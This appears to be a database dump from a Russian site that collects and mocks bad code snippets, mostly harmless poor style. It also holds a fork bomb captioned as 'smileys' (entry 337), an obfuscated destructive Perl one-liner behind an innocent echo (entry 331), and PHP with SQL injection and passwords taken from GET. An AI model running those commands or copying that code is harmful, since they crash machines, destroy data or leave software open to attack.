  (313,2133,5,1230671081,0,'#начало индусокода\r\ndef desyatka(number):\r\n    return int(number/10.0)\r\n    \r\ndef edenica(number):\r\n    return number-desyatka(number)*10\r\n\r\nhours_string=[]\r\nfor a in range(0,30):\r\n    zzz=\"\"\r\n    if edenica(a)<5:\r\n        zzz = \" часа \"\r\n    if edenica(a)==1:\r\n        zzz = \" час \"\r\n    if desyatka(a)==1:\r\n        zzz = \" часов \"\r\n    if edenica(a)==0:\r\n        zzz = \" часов \"\r\n    if zzz==\"\":\r\n        zzz=\" часов \"\r\n    hours_string.append(zzz)\r\n\r\nminutes_string=[]\r\nfor a in range(0,60):\r\n    zzz=\"\"\r\n    if edenica(a)<5:\r\n        zzz = \" минуты \"\r\n    if edenica(a)==1:\r\n        zzz = \" минута \"\r\n    if desyatka(a)==1:\r\n        zzz = \" минут \"\r\n    if edenica(a)==0:\r\n        zzz = \" минут \"\r\n    if zzz==\"\":\r\n        zzz=\" минут \"\r\n    minutes_string.append(zzz)\r\n    \r\nseconds_string=[]\r\nfor a in range(0,60):\r\n    zzz=\"\"\r\n    if edenica(a)<5:\r\n        zzz = \" секунды \"\r\n    if edenica(a)==1:\r\n        zzz = \" секунда \"\r\n    if desyatka(a)==1:\r\n        zzz = \" секунд \"\r\n    if edenica(a)==0:\r\n        zzz = \" секунд \"\r\n    if zzz==\"\":\r\n        zzz=\" секунд \"\r\n    seconds_string.append(zzz)\r\n#конец индусокода','','Ф-ии, склоняющие по падежам и временам слова \"часов\", \"минут\", секунд',2,0,1,0),
  (314,2137,7,1230681706,1230870619,'double StrToMoney(AnsiString str)\r\n{\r\n  str = AnsiReplaceStr(str, \"-\", \".\");\r\n  char *buffer = str.c_str();\r\n  double val;\r\n  sscanf(buffer,\"%lf\",&val);\r\n  return val;\r\n}','','Быдлокодер на борланд С++ хотел сконвертить в число деньги в формате рубли-копейки. И сделал это наименее эффективным образом.',-2,0,0,0),
  (315,2140,3,1230682351,0,'query = \"select coach_id, \"\r\n  \" concat(coach_surname,'' '',coach_name,'' '',coach_pname, '' ('', (select name from price_coach_types where id_coach_type = coaches.coach_type), '')''), \"\r\n  \"ifnull((select price_single_child from price_coaches where coach_id = coaches.coach_id and price_start_date = \" + actual_price+ \"),0),\"\r\n  \"ifnull((select price_single_adult from price_coaches where coach_id = coaches.coach_id and price_start_date = \" + actual_price+ \"),0),\"\r\n  \"ifnull((select price_group_child from price_coaches where coach_id = coaches.coach_id and price_start_date = \" + actual_price+ \"),0),\"\r\n  \"ifnull((select price_group_adult from price_coaches where coach_id = coaches.coach_id and price_start_date = \" + actual_price+ \"),0)\"\r\n  \" from coaches order by binary coach_surname, coach_type\";','','Автор любитель копипастить свой код :)',6,0,1,0),
  (316,2143,6,1230684017,0,'for (i = 0; i<sizeof(n)*4; i++) \r\n{ \r\n\tif ((((n>>(2*i))&1==1)&&((n>>(2*i+1))&1==0)))\r\n\t{\r\n\t\tn|=(1<<(2*i));\r\n\t\tn&=~(1<<(2*i+1));\r\n\t}\r\nelse if ((((n>>(2*i))&1==0)&&((n>>(2*i+1))&1==1)))\r\n\t{\r\n\t\tn|=(1<<(2*i+1));\r\n\t\tn&=~(1<<(2*i));\r\n\t}','','Нечто вроде циклического сдвига вправо на Си.',7,0,1,0),
  (317,2145,6,1230684273,0,'// собственно заполнение\r\nfor (i = pdir ? old_end_y : old_end_x; i != pdir ? (sel_end_y + gstep) : (sel_end_x + gstep); i++)\r\n{\r\n  if (cells[pdir ? sel_x : i][pdir ? i : sel_y])\r\n    freemem(cells[pdir ? sel_x : i][pdir ? i : sel_y]);\r\n  if (is_arith)\r\n  {\r\n    cells[pdir ? sel_x : i][pdir ? i : sel_y] = ftoa(arith_first);\r\n    arith_first += arith_step;\r\n  }\r\n  else\r\n  {\r\n  if (cells[sel_x][sel_y])\r\n  {\r\n    cells[pdir ? sel_x : i][pdir ? i : sel_y] = (char*)allocmem(strlen(cells[sel_x][sel_y]) + 1);\r\n    strcpy(cells[pdir ? sel_x : i][pdir ? i : sel_y], cells[sel_x][sel_y]);\r\n  }\r\n}','12','Индус помешался на тернарной операции.',9,0,1,2),
  (318,2147,6,1230686418,0,'#define begin {\r\n#define end   }\r\n\r\n....\r\n\r\n//==================================\r\n// put a big character on the screen\r\n// c is index into bitmap\r\nvoid video_putchar(char x, char y, char c)  \r\nbegin \r\n    v7 = x;\r\n    for (v6=0;v6<7;v6++) \r\n    begin\r\n        v1 = bitmap[c][v6]; \r\n        v8 = y+v6;\r\n        ...\r\n    end\r\nend','','паскалист пишет на си',16,0,1,3),
  (319,2150,10,1230716942,1231078388,'for i := 0 to high(vParagsChanges) do\r\n    begin\r\n      if vParNumIn < vParagsChanges[i].ParNo1 then\r\n      begin\r\n        inc(vParNumOut, vParagsChanges[i].ParNo1 - vParNumIn);\r\n        vParNumIn := vParagsChanges[i].ParNo1;\r\n      end;\r\n\r\n      if i < high(vParagsChanges) then\r\n        if (vParagsChanges[i].ParNo1+vParagsChanges[i].Range=vParagsChanges[i+1].ParNo1) and\r\n        ((vParagsChanges[i].Kind=ckDelete) and (vParagsChanges[i+1].Kind=ckAdd)) then\r\n          {if vParagsChanges[i].Range = vParagsChanges[i+1].Range then} \r\n          begin\r\n            vUnitedPars := min(vParagsChanges[i].Range, vParagsChanges[i+1].Range);\r\n            if vParagsChanges[i+1].Range >= vUnitedPars then\r\n              vParagsChanges[i+1].Range := vParagsChanges[i+1].Range - vUnitedPars;\r\n            if vParagsChanges[i].Range >= vUnitedPars then\r\n              vParagsChanges[i].Range := vParagsChanges[i].Range - vUnitedPars;\r\n            for j := 0 to vUnitedPars-1 do \r\n            begin\r\n              FParsHL[vParNumIn+vInsertedCount1+j].Kind := pkReplaced;\r\n              vTagsInfoEx := GetTagsInfo(Editor1.Parag(vParNumIn+vInsertedCount1+j).Str); \r\n              FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups := GetViewGroupsByChangeItems(vTagsInfoEx.TagKinds);\r\n              vTagsInfoEx := GetTagsInfo(Editor2.Parag(vParNumIn+vInsertedCount1+j).Str);\r\n              FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups := FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups + GetViewGroupsByChangeItems(vTagsInfoEx.TagKinds);\r\n              if vParagsChanges[i].InCard then \r\n                FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups := FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups + [vgCard]\r\n              else\r\n                FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups := FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups + [vgText];\r\n            end;\r\n            inc(vParNumIn, vUnitedPars);\r\n            inc(vParNumOut, vUnitedPars);\r\n          end;\r\n\r\n      case vParagsChanges[i].Kind of\r\n        ckAdd: begin\r\n          for j := 0 to vParagsChanges[i].Range-1 do\r\n          begin\r\n            vTmpParag := TRTFParag.Create(nil, False, False, raLeft{raRight});\r\n            FEditor1.InsPar(vParNumIn+vInsertedCount1+j, vTmpParag, false);\r\n            FParsHL[vParNumIn+vInsertedCount1+j].Kind := pkAdded;\r\n            vTagsInfoEx := GetTagsInfo(Editor2.Parag(vParNumOut+vInsertedCount2+j).Str); \r\n            if vParagsChanges[i].InCard then \r\n              FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups := GetViewGroupsByChangeItems(vTagsInfoEx.TagKinds) + [vgCard]\r\n            else \r\n              FParsHL[vParNumIn+vInsertedCount1+j].ViewGroups := GetViewGroupsByChangeItems(vTagsInfoEx.TagKinds) + [vgText];\r\n          end;\r\n          inc(vInsertedCount1, vParagsChanges[i].Range);\r\n          inc(vParNumOut, vParagsChanges[i].Range);\r\n        end;\r\n        ckDelete: begin\r\n          for j := 0 to vParagsChanges[i].Range-1 do\r\n          begin\r\n            vTmpParag := TRTFParag.Create(nil, False, False, raLeft);\r\n            FEditor2.InsPar(vParNumOut+vInsertedCount2+j, vTmpParag, false);\r\n            FParsHL[vParNumOut+vInsertedCount2+j].Kind := pkDeleted;\r\n            vTagsInfoEx := GetTagsInfo(Editor1.Parag(vParNumIn+vInsertedCount1+j).Str); \r\n            if vParagsChanges[i].InCard then \r\n              FParsHL[vParNumOut+vInsertedCount2+j].ViewGroups := GetViewGroupsByChangeItems(vTagsInfoEx.TagKinds) + [vgCard]\r\n            else \r\n              FParsHL[vParNumOut+vInsertedCount2+j].ViewGroups := GetViewGroupsByChangeItems(vTagsInfoEx.TagKinds) + [vgText];\r\n          end;\r\n          inc(vInsertedCount2, vParagsChanges[i].Range);\r\n          inc(vParNumIn, vParagsChanges[i].Range);\r\n        end;\r\n        ckModify: begin \r\n          if (ciAlignment in vParagsChanges[i].ChangedItems) and (vParagsChanges[i].StrChanges = nil) then\r\n            FParsHL[vParNumIn+vInsertedCount1].Kind := pkAlignment\r\n          else\r\n            FParsHL[vParNumIn+vInsertedCount1].Kind := pkModified;\r\n\r\n          FParsHL[vParNumIn+vInsertedCount1].Changes := GetViewChanges(vParagsChanges[i].StrChanges);\r\n          FParsHL[vParNumIn+vInsertedCount1].ViewGroups := GetViewGroupsByChangeItems(vParagsChanges[i].ChangedItems);\r\n          if vParagsChanges[i].InCard then \r\n            if (ciText in vParagsChanges[i].ChangedItems) or (ciAlignment in vParagsChanges[i].ChangedItems) then \r\n            begin \r\n              FParsHL[vParNumIn+vInsertedCount1].ViewGroups := FParsHL[vParNumIn+vInsertedCount1].ViewGroups + [vgCard];\r\n              FParsHL[vParNumIn+vInsertedCount1].ViewGroups := FParsHL[vParNumIn+vInsertedCount1].ViewGroups - [vgText, vgAlignment];\r\n\r\n              for j := 0 to high(FParsHL[vParNumIn+vInsertedCount1].Changes) do \r\n                if FParsHL[vParNumIn+vInsertedCount1].Changes[j].ViewGroup = vgText then\r\n                  FParsHL[vParNumIn+vInsertedCount1].Changes[j].ViewGroup := vgCard;\r\n            end;\r\n\r\n          inc(vParNumIn, 1);\r\n          inc(vParNumOut, 1);\r\n        end;\r\n      end;\r\n    end;','','Такой г****код возник не за 1 день. Голову пришлось поломать основательно :))\r\nКомментарии убраны, дабы не портить удовольствие от прочтения.',-1,0,0,2),
  (320,2155,6,1230820575,0,'year = ORIGINYEAR; /* = 1980 */\r\n\r\nwhile (days > 365)\r\n{\r\n    if (IsLeapYear(year))\r\n    {\r\n        if (days > 366)\r\n        {\r\n            days -= 366;\r\n            year += 1;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        days -= 365;\r\n        year += 1;\r\n    }\r\n}','','Код часов в M$ Zune 30GB.',9,0,1,1),
  (321,2159,1,1230834929,1230967411,'<?php\r\nfunction word_filter($str) {\r\n\t$filtered = '''';\r\n\tfor ($i = 0; $i <= strlen($str) - 1; $i++) {\r\n\t\t$char = substr($str, $i, 1);\r\n\t\tif (ctype_alpha($char)) {\r\n\t\t\t$filtered .= $char;\r\n\t\t}\r\n\t}\r\n\treturn $filtered;\r\n}','','как делают дебилы: $i <= strlen($str) - 1;\r\nкто знает, так - $j = strlen($str), $i < $j',-12,0,0,8),
  (322,2171,1,1230910702,0,'if(count($a)>0)\r\n{\r\n\tfor($i=0; $i<count($a); $i++)\r\n\t{\r\n\t\t//код код код\r\n\t}\r\n}','','что-то подобное)',20,0,1,2),
  (324,2179,1,1230930137,0,'<?php\r\nfunction is_featured($word_id) {\r\n\t$sql = \"SELECT * FROM `featured` WHERE `featured_id` = ''$word_id''\";\r\n\t$results = mysql_query($sql);\r\n\tif (mysql_num_rows($results)) {\r\n\t\treturn true;\r\n\t} else {\r\n\t\treturn false;\r\n\t}\r\n}','','Классический говнокод, встречаю очень часто',5,0,1,8),
  (325,2181,7,1230938478,0,'BOOL ConvertDays(UINT32 days, SYSTEMTIME* lpTime)\r\n{\r\n    int dayofweek, month, year;\r\n    UINT8 *month_tab;\r\n\r\n    //Calculate current day of the week\r\n    dayofweek = GetDayOfWeek(days);\r\n\r\n    year = ORIGINYEAR;\r\n\r\n    while (days > 365)\r\n    {\r\n        if (IsLeapYear(year))\r\n        {\r\n            if (days > 366)\r\n            {\r\n                days -= 366;\r\n                year += 1;\r\n            }\r\n        }\r\n        else\r\n        {\r\n            days -= 365;\r\n            year += 1;\r\n        }\r\n    }\r\n\r\n\r\n    // Determine whether it is a leap year\r\n    month_tab = (UINT8 *)((IsLeapYear(year))? monthtable_leap : monthtable);\r\n\r\n    for (month=0; month<12; month++)\r\n    {\r\n        if (days <= month_tab[month])\r\n            break;\r\n        days -= month_tab[month];\r\n    }\r\n\r\n    month += 1;\r\n\r\n    lpTime->wDay = days;\r\n    lpTime->wDayOfWeek = dayofweek;\r\n    lpTime->wMonth = month;\r\n    lpTime->wYear = year;\r\n\r\n    return TRUE;\r\n}','','То что вызвало зависание всех MS Zune 30Gb по всему миру.',6,0,1,1),
  (326,2188,1,1230984221,0,'if ($_POST[''id'']) {\r\n  $id = $_POST[''id''];\r\n} elseif ($_GET[''id'']) {\r\n  $id = $_GET[''id''];\r\n}\r\nif (isset($_POST[''password''])) {\r\n  $password = md5($_POST[''password'']);\r\n} elseif (isset($_GET[''password''])) {\r\n  $password = md5($_GET[''password'']);\r\n}','','',8,0,1,1),
  (327,2191,1,1230990413,0,'$price = round(100*$price*$selected_currency_details[1])/100;\r\n\tif (round($price*10) == $price*10 && round($price)!=$price)\r\n\t\t$price = \"$price\".\"0\"; //to avoid prices like 17.5 - write 17.50 instead','','  Shop-Script PREMIUM',24,0,1,2),
  (328,2201,1,1231064150,0,'$rand = rand ( 100, 1000000000 );\r\n$sess = md5 ( $rand );\r\necho \"<form method=\\\"post\\\" action=\\\"?sid=\" . $sess . \">\";\r\necho \"Введите код с картинки: \" . $rand . \"<br>\";\r\necho \"<input name=\\\"cod\\\"><br>\";\r\necho \"<input type=\\\"submit\\\" value=\\\"Отправить\\\">','','сильнейшая капча',23,0,1,2),
  (329,2205,12,1231074205,1231179003,'BuildRotateMatrix_:\r\n\tmov edi,offset _RotateM\r\n\r\n\tfld [esi]._x\r\n\tfsincos\r\n\r\n\tfld [esi]._y\r\n\tfsincos\r\n\r\n\tfld [esi]._z\r\n\tfsincos\r\n\r\n\tfld st(0)\r\n\tfmul st(0),st(3)\r\n\tfstp [edi]._E00\r\n\r\n\tfld st(2)\r\n\tfmul st(0),st(2)\r\n\tfstp [edi]._E01\r\n\r\n\tfld st(3)\r\n\tfchs\r\n\tfstp [edi]._E02\r\n\t\r\n\tfld st(5)\r\n\tfmul st(0),st(4)\r\n\tfmul st(0),st(1)\r\n\r\n\tfld st(5)\r\n\tfmul st(0),st(3)\r\n\r\n\tfsubp st(1),st(0)\r\n\tfstp [edi]._E10\r\n\r\n\tfld st(5)\r\n\tfmul st(0),st(3)\r\n\tfmul st(0),st(1)\r\n\tfld st(5)\r\n\tfmul st(0),st(4)\r\n\tfaddp st(1),st(0)\r\n\tfstp [edi]._E11\r\n\r\n\tfld st(5)\r\n\tfmul st(0),st(3)\r\n\tfstp [edi]._E12\r\n\r\n\tfld st(4)\r\n\tfmul st(0),st(4)\r\n\tfmul st(0),st(1)\r\n\r\n\tfld st(6)\r\n\tfmul st(0),st(3)\r\n\r\n\tfaddp st(1),st(0)\r\n\tfstp [edi]._E20\r\n\r\n\tfld st(4)\r\n\tfmul st(0),st(4)\r\n\tfmul st(0),st(2)\r\n\r\n\tfld st(6)\r\n\tfmul st(0),st(2)\r\n\r\n\tfsubp st(1),st(0)\r\n\tfstp [edi]._E21\r\n\r\n\tfld st(4)\r\n\tfmul st(0),st(3)\r\n\tfstp [edi]._E22\r\n\r\n\tfinit\r\n\r\n\tfld1\r\n\tfstp [edi]._E33\r\n\r\n\txor eax,eax\r\n\tmov [edi]._E03,eax\r\n\tmov [edi]._E13,eax\r\n\tmov [edi]._E23,eax\r\n\r\n\tmov [edi]._E30,eax\r\n\tmov [edi]._E31,eax\r\n\tmov [edi]._E32,eax\r\n\r\n\tret','','На самом деле это не говнокод, но на осомблере всё выглядит как кусок говна :3',-10,0,0,0),
  (330,2218,12,1231106828,1231201209,'db \"Ассемблер язык настолько суровый, что для него нет понятия говнокода!\"','','',-10,0,0,0),
  (331,2220,4,1231112296,1231684078,'echo \"test... test... test...\" | perl -e ''$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;;y; -/:-@[-`{-};`-{/\" -;;s;;$_;see''','','',-3,0,0,4),
  (332,2222,7,1231149762,0,'/* ...*/ someMethod (/*someargs*/) {\r\n    //...\r\n\tCreate();\r\n\tCreate();\r\n\tCreate();\r\n\tCreate();\r\n\tCreate();\r\n    //...\r\n}','','',7,0,1,0),
  (333,2227,1,1231166981,0,'if($show[10]==''1'' || substr($quest[$key][''QShowC''],1,1)==''1'')','','Двоичная арифметика на стрингах... логическое И (&)...',10,0,1,0),
  (334,2234,1,1231242350,0,'function _isArr($value, $Arr) {\r\n\t\tif(!isset($Arr))\r\n\t\t\treturn true;\r\n\t\tfor($i=0;$i<count($Arr);$i++)\r\n\t\t\tif($Arr[$i]==$value)\r\n\t\t\t\treturn true;\r\n\t\treturn false;\r\n\t}','','Смотрим, самая нужная функция...ну после in_array конечно...и обратите внимание, проверить обязательный параметр на наличие внутри функции обязательно!',5,0,1,2),
  (335,2236,1,1231248312,0,'if ($prev > $next || $prev == $next)\r\n    $next = 0 ;','','',10,0,1,0),
  (336,2239,1,1231254337,1231326769,'Процедура ВакансииРаботодателя()\r\n   \r\n    Таб=СоздатьОбъект(\"Таблица\");\r\n    Таб.ИсходнаяТаблица(\"НайденныеВакансии\");\r\n    Таб.ВывестиСекцию(\"Все<\");\r\n   \r\n    СпрВакансии=СоздатьОбъект(\"Справочник.Вакансии\");\r\n   \r\n   НомПП=0;\r\n   СпрВакансии.ВыбратьЭлементыПоРеквизиту(\"Работодатель\",ТекущийЭлемент(),0,0);\r\n   Пока СпрВакансии.ПолучитьЭлемент()=1 Цикл   \r\n      \r\n      НомПП=НомПП+1;\r\n      Таб.ВывестиСекцию(\"Вакансия\");\r\n      \r\n   КонецЦикла;   \r\n   \r\n   Таб.ВывестиСекцию(\"Все>\");\r\n   Таб.ТолькоПросмотр(1);\r\n   Таб.Показать();\r\n   \r\nКонецПроцедуры','','КОД НА 1С!!!\r\nХоть все и работает, но говнокод сам язык)))',-14,0,0,0),
  (337,2242,4,1231254930,0,':(){ :&:;};:','','Смайлики на POSIX Shell',0,0,1,0),
  (338,2244,5,1231260535,0,'#-*- coding:cp1251 -*-\r\nfrom Tkinter import *\r\n\"\"\" pyCalc by deluxe, thanks to Sanch0\r\nКалькулятор работает только с 2 числами и одним действием над ними.\"\"\"\r\n# глобальные переменные\r\nx1=''''\r\nx2=''''\r\ndeistvie=''''\r\n# функции батонов ввода цифр и запятой\r\n# если действие еще не задано, заполняется х1, а если задано - х2\r\n# и значение переменной отражается на соотв. виджете\r\ndef press1():  \r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''1''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''1''\r\n\t\tlblx2.configure(text=x2)\r\ndef press2():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''2''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''2''\r\n\t\tlblx2.configure(text=x2)\r\ndef press3():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''3''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''3''\r\n\t\tlblx2.configure(text=x2)\r\ndef press4():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''4''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''4''\r\n\t\tlblx2.configure(text=x2)\r\ndef press5():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''5''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''5''\r\n\t\tlblx2.configure(text=x2)\r\ndef press6():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''6''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''6''\r\n\t\tlblx2.configure(text=x2)\r\ndef press7():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''7''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''7''\r\n\t\tlblx2.configure(text=x2)\r\ndef press8():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''8''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''8''\r\n\t\tlblx2.configure(text=x2)\r\ndef press9():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''9''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''9''\r\n\t\tlblx2.configure(text=x2)\r\ndef press0():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''0''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''0''\r\n\t\tlblx2.configure(text=x2)\r\ndef pressdot():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''.''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''.''\r\n\t\tlblx2.configure(text=x2)','','',11,0,1,0),
  (339,2249,1,1231274985,0,'function show_admin_skin_file($skin_file)\r\n{\r\n//Общие переменные\r\nglobal $yes, $no, $admin, $errors, $page, $messages, $i;\r\n\r\n//Переменные раздела ''Статус''\r\nglobal $admin_skin, $guest_skin, $gb_title, $gb_description, $admin_skin_title, $admin_skin_author, $guest_skin_title, $guest_skin_author;\r\nglobal $is_readable_data, $is_writable_data, $is_readable_blocked_ip, $is_writable_blocked_ip, $is_readable_config, $is_writable_config, $is_readable_time, $is_writable_time;\r\nglobal $opened_or_closed, $messages, $data_size, $users, $smiles;\r\n\r\n//Переменные раздела ''Управление гостевой''\r\nglobal $smiles, $name, $city, $email, $url, $icq, $msg, $msg_number, $time, $mod_time, $ip, $if_blocked, $info, $answer, $mod_current_time;\r\n\r\n//Переменные раздела ''Настройки''\r\nglobal $current_time, $guest_skin_list, $admin_skin_list, $opened_or_closed_button, $close_button, $open_button, $site_title, $site_keywords, $site_description, $site_charset, $server_info, $last_msgs_on_top, $last_page_firstly, $max_msgs_per_page, $name_maxlenght, $email_maxlenght, $city_maxlenght, $url_maxlenght, $icq_maxlenght, $msg_maxlenght, $word_maxlenght, $smiles_on_page, $execution_time;\r\n\r\n//Переменные раздела ''Редактирование скина''\r\nglobal $guest_header_file, $guest_msg_file, $guest_footer_file, $guest_errors_file, $error;\r\nglobal $back, $next, $all, $spacer, $no_parametr, $link_next, $link_back, $link_all, $pages;\r\nglobal $is_writable_guest_skin_config, $is_writable_guest_skin_header, $is_writable_guest_skin_msg, $is_writable_guest_skin_footer, $is_writable_guest_skin_errors;\r\n\r\n//Переменные раздела ''Управление временем''\r\nglobal $date_format, $monthes, $wdays, $cookies_life, $def_ip_time, $flood_time;\r\n\r\n//Переменные раздела ''Блоки''\r\nglobal $block_code, $blocked_ip_code, $blocked_ip, $blocked_ip_time, $blocked_ip_date, $cur_status, $ip_num;','','Шаблонизатор гостевой книги',20,0,1,0),
  (340,2252,8,1231281371,1231586740,'private void OnRdbDatesCheckedChanged(object sender, EventArgs e)\r\n{\r\n            if (rdbMonth.Checked)\r\n                MakeDateViewVisible(\"month\");\r\n            else if (rdbQuarter.Checked)\r\n                MakeDateViewVisible(\"quarter\");\r\n            else if (rdbYear.Checked)\r\n                MakeDateViewVisible(\"year\");\r\n            else\r\n                MakeDateViewVisible(\"individual\");\r\n}\r\n\r\nprivate void MakeDateViewVisible(string dateView)\r\n{\r\n            switch (dateView)\r\n            {\r\n                case \"year\":\r\n                    YearView.Visible = true;\r\n                    QuarterView.Visible = false;\r\n                    MonthView.Visible = false;\r\n                    IndividualDatesView.Visible = false;\r\n                    break;\r\n                case \"quarter\":\r\n                    YearView.Visible = false;\r\n                    QuarterView.Visible = true;\r\n                    MonthView.Visible = false;\r\n                    IndividualDatesView.Visible = false;\r\n                    break;\r\n                case \"month\":\r\n                    YearView.Visible = false;\r\n                    QuarterView.Visible = false;\r\n                    MonthView.Visible = true;\r\n                    IndividualDatesView.Visible = false;\r\n                    break;\r\n                case \"individual\":\r\n                    YearView.Visible = false;\r\n                    QuarterView.Visible = false;\r\n                    MonthView.Visible = false;\r\n                    IndividualDatesView.Visible = true;\r\n                    break;\r\n            }\r\n}','','Зато красиво методы вызываются!',-6,0,0,2),
  (341,2260,1,1231318955,1231451884,'if ($sUnitsSQL != '''') {\r\n\t\t\t$sUnits = '''';\r\n\t\t\t$sRSSToday = date(''j F Y, g:i'');\r\n\t\t\t//$sDateFormat = ''%a, %e %b %Y %k:%i:%s GMT'';\r\n\r\n\t\t\t$aPIDOwnerInfo = getProfileInfo($iPID);\r\n\r\n\t\t\t$vUnits = db_res( $sUnitsSQL );\r\n\r\n\t\t\t$iUnitLimitChars = (int)getParam(\"max_blog_preview\");\r\n\t\t\twhile ( $aUnitInfo = mysql_fetch_assoc($vUnits) ) {\r\n\t\t\t\t/*$aOwnerInfo = getProfileInfo($aUnitInfo[''OwnerID'']);\r\n\t\t\t\t$aUser = array(''Permalink''=>$aOwnerInfo[''NickName''], ''Link''=>$aUnitInfo[''OwnerID'']);\r\n\t\t\t\t$aPost = array(''Permalink''=>$aUnitInfo[''UnitUri''], ''Link''=>$aUnitInfo[''UnitID'']);*/\r\n\t\t\t\t$sUnitUrl = $oLinkGenerator->genUrl($aUnitInfo[''UnitID''], $aUnitInfo[''UnitUri'']);\r\n\r\n\t\t\t\t$sUnitTitle = process_line_output($aUnitInfo[''UnitTitle'']);\r\n\t\t\t\t$sUnitDate = LocaledDataTime($aUnitInfo[''UnitDateTimeUTS'']);\r\n\r\n\t\t\t\t$sLinkMore = '''';\r\n\t\t\t\tif ( strlen( $aUnitInfo[''UnitDesc'']) > $iUnitLimitChars ) {\r\n\t\t\t\t\t$sLinkMore = \"... <a href=\\\"\".$sUnitUrl.\"\\\">\"._t(''_Read more'').\"</a>\";\r\n\t\t\t\t}\r\n\t\t\t\t$sUnitDescVal = mb_substr( strip_tags($aUnitInfo[''UnitDesc'']), 0, $iUnitLimitChars ) . $sLinkMore;\r\n\t\t\t\t$sUnitDesc = <<<EOF\r\nDate: {$sUnitDate}<br />\r\nDescription: {$sUnitDescVal}<br />\r\nEOF;\r\n\r\n\t\t\t\t$sRSSUnitIcon = '''';\r\n\t\t\t\t/*if (false) {\r\n\t\t\t\t\t$sUnitIcon = (strlen(trim($aUnitInfo[''UnitIcon''])) && file_exists($dir[''sdatingImage''] . $aUnitInfo[''UnitIcon'']))\r\n\t\t\t\t\t\t? \"{$site[''sdatingImage'']}thumb_{$aUnitInfo[''UnitIcon'']}\" : $oLinkGenerator->sPicNotAvail;\r\n\t\t\t\t\t$sRSSUnitIcon = \"<image>{$sUnitIcon}</image>\";\r\n\t\t\t\t}*/\r\n\r\n\t\t\t\t$sUnitRSSFeed .= <<<EOF\r\n<item>\r\n\t<title><![CDATA[{$sUnitTitle}]]></title>\r\n\t{$sRSSUnitIcon}\r\n\t<link><![CDATA[{$sUnitUrl}]]></link>\r\n\t<description><![CDATA[{$sUnitDesc}]]></description>\r\n\t<pubDate>{$sUnitDate}</pubDate>\r\n</item>\r\nEOF;\r\n\t\t\t}\r\n\r\n\t\t\t$sRSSTitle = \"{$sUnitTypeC} RSS\";\r\n\t\t\tif ($iPID>0) {\r\n\t\t\t\t$sRSSTitle = $aPIDOwnerInfo[''NickName''] . \"''s Recent {$sUnitTypeC}\";\r\n\t\t\t}\r\n\r\n\t\t\t$sRet = <<<EOF\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<rss version=\"2.0\">\r\n\t<channel>\r\n\t\t<title>{$sRSSTitle}</title>\r\n\t\t<link>{$site[''url'']}{$sMainLink}</link>\r\n\t\t<description>{$sRSSTitle}</description>\r\n\t\t<lastBuildDate>{$sRSSToday}</lastBuildDate>\r\n\t\t\t{$sUnitRSSFeed}\r\n\t</channel>\r\n</rss>\r\nEOF;\r\n\t\t\treturn $sRet;\r\n\t\t}','','Как Вам такой стиль написания кода?',-6,0,0,5),
  (342,2262,7,1231320253,0,'class T\r\n{\r\nprivate:\r\n  T();\r\n  ~T();\r\npublic:\r\n  static T& instance()\r\n  {\r\n    static T t[5];\r\n    return t[rand() % 6];\r\n  }\r\n  ...\r\n};','','придумалось при обсуждении паттерна синглтон и его возможых реализаций.\r\n\"Антисинглтон\" или \"Русская рулетка\".',7,0,1,0),
  (343,2276,1,1231414241,0,'<?php\r\nif (\"$payment_method\" ==  \"1\") {\r\n\r\n?>','','еще один шедевр, зачем так делать?',8,0,1,0),
  (344,2279,6,1231422364,1231507732,'if(True==true && True==false)\r\n   return True;','','нереальное условие',-14,0,0,1),
  (345,2281,1,1231423594,0,'<?\r\n$src = \"q: 1\r\nw: 2\r\ne: 3\";\r\n$res = explode(\"\\r\\n\", $src);\r\n foreach($res as $str) \r\n {\r\n list($parametr, $value) = explode(\": \", $str);\r\n $a[$parametr] = $value;\r\n echo $parametr.\"   \".$a[$parametr].\"\\r\\n\";\r\n?>\r\n }','','temp',1,0,1,0),
